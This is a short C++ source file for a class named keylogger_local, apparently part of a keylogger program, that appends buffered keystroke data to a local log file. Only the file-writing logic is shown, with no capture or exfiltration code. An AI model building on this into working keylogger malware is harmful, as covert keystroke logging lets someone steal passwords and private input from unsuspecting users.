#include "./keylogger_local.hpp"

keylogger_local::keylogger_local(string p_destination_path) :
		keylogger()
{
	a_ofstream = new ofstream();

	a_ofstream->open(p_destination_path.c_str(), std::ofstream::out
			| std::ofstream::app);
}

keylogger_local::~keylogger_local()
{
	a_ofstream->close();

	delete a_ofstream;
}

void keylogger_local::store()
{
	*a_ofstream << *a_buffer << endl;

	a_ofstream->flush();

	a_buffer->clear();
}
